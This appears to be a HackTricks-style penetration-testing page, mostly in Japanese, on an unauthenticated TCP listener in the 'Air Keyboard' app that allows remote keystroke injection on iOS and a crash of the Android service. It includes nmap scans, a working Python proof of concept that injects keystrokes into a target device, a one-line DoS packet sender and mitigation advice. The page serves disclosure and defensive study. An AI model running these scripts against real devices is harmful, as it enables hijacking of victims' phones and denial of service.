# Air Keyboard Remote Input Injection (Unauthenticated TCP Listener)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

iOS版の商用「Air Keyboard」アプリケーション（App Store ID 6463187929）は、**ポート8888でクリアテキストTCPサービスを開き**、**認証なしでキーストロークフレームを受け入れます**。  
同じWi-Fiネットワーク上の任意のデバイスがそのポートに接続し、被害者の電話に任意のキーボード入力を注入することができ、**完全なリモートインタラクションハイジャック**を実現します。

対応するAndroidビルドは**ポート55535**でリッスンします。弱いAES-ECBハンドシェイクを実行しますが、作成されたゴミデータが**OpenSSL復号ルーチンで未処理の例外を引き起こし**、バックグラウンドサービスをクラッシュさせます（**DoS**）。

## 1. Service Discovery

ローカルネットワークをスキャンし、アプリで使用される2つの固定ポートを探します:
```bash
# iOS (input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
Android端末では、責任のあるパッケージをローカルで特定できます:
```bash
adb shell netstat -tulpn | grep 55535     # no root required on emulator

# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                # map PID → package name
```
## 2. フレームフォーマット (iOS)

バイナリは、`handleInputFrame()` ルーチン内の次の解析ロジックを明らかにします:
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
宣言された長さには `device_id` バイトが含まれていますが、2 バイトのヘッダー自体は含まれていません。

## 3. エクスプロイト PoC
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard for iOS"""
import socket, sys

target_ip = sys.argv[1]                  # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"     # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                         # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("Injected", keystrokes)
```
任意の印刷可能なASCII（`\n`、`\r`、特殊キーなどを含む）は送信可能であり、攻撃者に物理的なユーザー入力と同じ力を与えます：アプリの起動、IMの送信、フィッシングURLの訪問など。

## 4. Android Companion – サービス拒否

Androidポート（55535）は、**ハードコーディングされたAES-128-ECBキー**で暗号化された4文字のパスワードとランダムなノンスを期待します。 解析エラーは`AES_decrypt()`にバブルアップし、キャッチされず、リスナースレッドが終了します。 したがって、単一の不正なパケットで正当なユーザーを切断し、プロセスが再起動されるまで接続を維持するのに十分です。
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
## 5. 根本原因

1. **受信フレームのオリジン/整合性チェックがない** (iOS)。
2. **暗号の誤用** (静的キー、ECB、長さ検証の欠如) と **例外処理の欠如** (Android)。

## 6. 緩和策と強化アイデア

* モバイル端末で認証されていないサービスを決して公開しない。
* オンボーディング中にデバイスごとの秘密を導出し、入力処理の前にそれらを検証する。
* リスナーを `127.0.0.1` にバインドし、リモートコントロールのために相互認証された暗号化トランスポート (例: TLS, Noise) を使用する。
* モバイルセキュリティレビュー中に予期しないオープンポートを検出する (`netstat`, `lsof`, `frida-trace` on `socket()` など)。
* エンドユーザーとして: Air Keyboard をアンインストールするか、信頼できる隔離された Wi-Fi ネットワークでのみ使用する。

## 検出チートシート (ペンテスター)
```bash
# Quick one-liner to locate vulnerable devices in a /24
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - | awk '/Ports/{print $2,$3,$4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do echo -n \"$p → "; cat /proc/$p/cmdline; done"
```
## 参考文献

- [Air Keyboard iOSアプリのリモート入力インジェクション脆弱性は未修正のまま](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)
- [CXSecurityアドバイザリー WLB-2025060015](https://cxsecurity.com/issue/WLB-2025060015)

{{#include ../../banners/hacktricks-training.md}}
